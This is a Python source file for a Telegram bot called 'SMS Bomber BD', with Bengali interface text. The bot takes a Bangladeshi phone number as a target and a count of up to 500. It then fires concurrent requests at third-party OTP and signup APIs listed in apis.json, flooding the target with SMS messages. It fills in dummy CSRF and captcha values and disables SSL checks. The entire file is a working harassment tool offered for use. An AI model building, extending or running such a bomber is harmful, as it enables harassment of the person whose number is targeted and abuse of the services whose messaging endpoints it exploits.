import os
import json
import random
import asyncio
import aiohttp
import logging
from typing import Dict, List, Tuple, Optional
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, ConversationHandler, ContextTypes, filters
from aiohttp import web

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# States
PHONE, AMOUNT = range(2)

# Global stats per user (we'll store in context.user_data instead)
# But for simplicity, we'll pass stats object in bombing task

# Load APIs
def load_apis() -> List[Dict]:
    try:
        with open('apis.json', 'r', encoding='utf-8') as f:
            data = json.load(f)
            return data.get('apis', [])
    except Exception as e:
        logger.error(f"Error loading APIs: {e}")
        return []

# Placeholder replacement
def prepare_request(api: Dict, phone: str) -> Tuple[str, str, Dict, str]:
    """Replace all placeholders in URL, body, headers."""
    url = api['url']
    url = url.replace('{{phone}}', phone)
    url = url.replace('*****', phone)
    url = url.replace('88{{phone}}', f'88{phone}')

    body = api.get('body', '')
    if body:
        body = body.replace('{{phone}}', phone)
        body = body.replace('*****', phone)
        body = body.replace('88{{phone}}', f'88{phone}')
        body = body.replace('{{email}}', f'{phone}@temp.com')
        body = body.replace('{{randomName}}', 'User')
        body = body.replace('{{randomEmail}}', f'{phone}@mail.com')
        body = body.replace('{{firstName}}', 'John')
        body = body.replace('{{lastName}}', 'Doe')
        body = body.replace('{{csrf_token}}', 'dummy_csrf_token')
        body = body.replace('{{captchaToken}}', 'dummy_captcha')
        body = body.replace('{{apiKey}}', 'dummy_api_key')
        body = body.replace('{{token}}', 'dummy_token')
        body = body.replace('{{bearer}}', 'dummy_bearer')
        body = body.replace('{{timestamp}}', '1234567890')
        body = body.replace('{{deviceId}}', 'dummy_device_id')
        body = body.replace('{{xsrfToken}}', 'dummy_xsrf')
        body = body.replace('{{auth}}', 'dummy_auth')
        body = body.replace('{{nextAction}}', 'dummy_action')
        body = body.replace('{{routerState}}', 'dummy_state')
        body = body.replace('{{boundary}}', '----WebKitFormBoundary')
        body = body.replace('{{csrf}}', 'dummy_csrf')
        body = body.replace('{{apiToken}}', 'dummy_api_token')
        body = body.replace('{{authToken}}', 'dummy_auth_token')

    headers = api.get('headers', {})
    # Clean headers: remove None values
    headers = {k: v for k, v in headers.items() if v is not None}
    method = api.get('method', 'GET').upper()

    return url, method, headers, body

# Send SMS with retry
async def send_sms(session: aiohttp.ClientSession, api: Dict, phone: str, retries: int = 2) -> bool:
    """Send request with retries."""
    url, method, headers, body = prepare_request(api, phone)
    timeout = aiohttp.ClientTimeout(total=10)

    for attempt in range(retries + 1):
        try:
            if method == 'GET':
                async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                    if resp.status in [200, 201, 202, 204]:
                        return True
            else:
                content_type = headers.get('Content-Type', '').lower()
                if 'application/json' in content_type:
                    try:
                        json_body = json.loads(body) if body else {}
                        async with session.post(url, json=json_body, headers=headers, timeout=timeout, ssl=False) as resp:
                            if resp.status in [200, 201, 202, 204]:
                                return True
                    except json.JSONDecodeError:
                        async with session.post(url, data=body, headers=headers, timeout=timeout, ssl=False) as resp:
                            if resp.status in [200, 201, 202, 204]:
                                return True
                else:
                    async with session.post(url, data=body, headers=headers, timeout=timeout, ssl=False) as resp:
                        if resp.status in [200, 201, 202, 204]:
                            return True
        except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as e:
            logger.debug(f"API '{api.get('name')}' attempt {attempt+1} failed: {e}")
            if attempt < retries:
                await asyncio.sleep(0.3)  # small delay before retry
                continue
        except Exception as e:
            logger.debug(f"Unexpected error: {e}")
            break
    return False

# Bombing worker with concurrency
async def bombing_task(phone: str, amount: int, apis: List[Dict], update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = {'success': 0, 'failed': 0}
    progress_msg_id = None

    # Send initial progress message
    initial_msg = await update.message.reply_text("⏳ বোম্বিং শুরু হচ্ছে...")
    progress_msg_id = initial_msg.message_id

    # Shuffle APIs
    shuffled_apis = apis.copy()
    random.shuffle(shuffled_apis)

    # Concurrency limit
    semaphore = asyncio.Semaphore(20)

    # Animation frames
    animation_frames = ['🔄', '💣', '⚡', '🔥', '💥', '📨']

    async def worker(api):
        nonlocal stats
        async with semaphore:
            success = await send_sms(session, api, phone)
            if success:
                stats['success'] += 1
            else:
                stats['failed'] += 1

    connector = aiohttp.TCPConnector(ssl=False, limit=50)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Distribute APIs across amount
        # We'll cycle through shuffled_apis, but for large amount we use all in parallel chunks
        tasks = []
        for i in range(amount):
            if context.user_data.get('stop_bombing', False):
                break

            api = shuffled_apis[i % len(shuffled_apis)]
            tasks.append(asyncio.create_task(worker(api)))

            # Limit number of concurrently pending tasks to avoid memory issues
            if len(tasks) >= 100:
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks = []

            # Progress update every 10 requests or at end
            if (i + 1) % 10 == 0 or i == amount - 1:
                # Animate
                frame = animation_frames[(i // 10) % len(animation_frames)]
                progress_text = (
                    f"{frame} **বোম্বিং চলছে...**\n"
                    f"━━━━━━━━━━━━━━━━━\n"
                    f"📱 নাম্বার: `{phone}`\n"
                    f"✅ সফল: {stats['success']}\n"
                    f"❌ ব্যর্থ: {stats['failed']}\n"
                    f"📊 অগ্রগতি: {i+1}/{amount}\n"
                    f"━━━━━━━━━━━━━━━━━"
                )
                try:
                    await context.bot.edit_message_text(
                        chat_id=update.effective_chat.id,
                        message_id=progress_msg_id,
                        text=progress_text,
                        parse_mode='Markdown'
                    )
                except Exception:
                    # If edit fails, send new message
                    progress_msg = await update.message.reply_text(progress_text, parse_mode='Markdown')
                    progress_msg_id = progress_msg.message_id

            # Small delay between batches
            if len(tasks) >= 50:
                await asyncio.sleep(0.2)

        # Wait for remaining tasks
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    # Final message
    final_report = (
        f"🎯 **বোম্বিং সম্পূর্ণ!**\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"📱 টার্গেট: `{phone}`\n"
        f"✅ সফল: {stats['success']}\n"
        f"❌ ব্যর্থ: {stats['failed']}\n"
        f"📊 সর্বমোট: {amount}\n"
        f"━━━━━━━━━━━━━━━━━\n\n"
        f"💡 আবার বোম্বিং করতে /start দিন"
    )
    await context.bot.edit_message_text(
        chat_id=update.effective_chat.id,
        message_id=progress_msg_id,
        text=final_report,
        parse_mode='Markdown'
    )

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data.clear()  # reset any previous state
    await update.message.reply_text(
        "💣 **SMS Bomber BD** 💣\n\n"
        "📱 টার্গেট নাম্বার দিন (11 ডিজিট):\n"
        "উদাহরণ: `01712345678`",
        parse_mode='Markdown'
    )
    return PHONE

# Get phone
async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    phone = update.message.text.strip()
    if not (phone.startswith('01') and len(phone) == 11 and phone.isdigit()):
        await update.message.reply_text(
            "❌ ভুল নাম্বার! 11 ডিজিটের বাংলাদেশি মোবাইল নম্বর দিন:\n"
            "উদাহরণ: `01712345678`",
            parse_mode='Markdown'
        )
        return PHONE

    context.user_data['phone'] = phone
    await update.message.reply_text(
        f"✅ নাম্বার: `{phone}`\n\n"
        "🔢 কতটি SMS পাঠাবেন? (সর্বোচ্চ 500)\n"
        "উদাহরণ: `100`",
        parse_mode='Markdown'
    )
    return AMOUNT

# Get amount and start bombing
async def get_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    amount_text = update.message.text.strip()
    try:
        amount = int(amount_text)
        if amount < 1 or amount > 500:
            raise ValueError
    except ValueError:
        await update.message.reply_text(
            "❌ ভুল সংখ্যা! 1 থেকে 500 এর মধ্যে লিখুন:\n"
            "আবার চেষ্টা করুন:"
        )
        return AMOUNT

    phone = context.user_data.get('phone')
    if not phone:
        await update.message.reply_text("⚠️ আগে নাম্বার দিন। /start দিন।")
        return ConversationHandler.END

    apis = load_apis()
    if not apis:
        await update.message.reply_text("❌ কোনো API পাওয়া যায়নি! apis.json চেক করুন।")
        return ConversationHandler.END

    # Set stop flag to False
    context.user_data['stop_bombing'] = False

    # Start bombing in background
    asyncio.create_task(bombing_task(phone, amount, apis, update, context))

    return ConversationHandler.END

# Stop bombing
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['stop_bombing'] = True
    await update.message.reply_text("🛑 বোম্বিং বন্ধ করা হচ্ছে...")

# Cancel conversation
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "❌ বাতিল করা হয়েছে।\n"
        "আবার শুরু করতে /start দিন"
    )
    return ConversationHandler.END

# Status
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    apis = load_apis()
    await update.message.reply_text(
        f"📊 **বর্তমান অবস্থা**\n\n"
        f"✅ উপলব্ধ API: {len(apis)}টি\n"
        f"🤖 বট স্ট্যাটাস: চালু আছে\n\n"
        f"বোম্বিং শুরু করতে /start দিন"
    )

# Error handler
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")
    try:
        if update and update.effective_message:
            await update.effective_message.reply_text("⚠️ একটি ত্রুটি হয়েছে! আবার চেষ্টা করুন।")
    except:
        pass

# Health check server
async def health_check(request):
    return web.Response(text="Bot is running!", status=200)

async def start_web_server():
    port = int(os.environ.get('PORT', 8080))
    app = web.Application()
    app.router.add_get('/', health_check)
    app.router.add_get('/health', health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logger.info(f"Health check server started on port {port}")

async def main():
    token = os.environ.get('BOT_TOKEN')
    if not token:
        logger.error("BOT_TOKEN environment variable not set!")
        return

    await start_web_server()

    application = Application.builder().token(token).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_amount)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('stop', stop))
    application.add_handler(CommandHandler('status', status))
    application.add_error_handler(error_handler)

    logger.info("Bot is running...")
    await application.initialize()
    await application.start()
    await application.updater.start_polling(allowed_updates=Update.ALL_TYPES)

    while True:
        await asyncio.sleep(3600)

if __name__ == '__main__':
    asyncio.run(main())
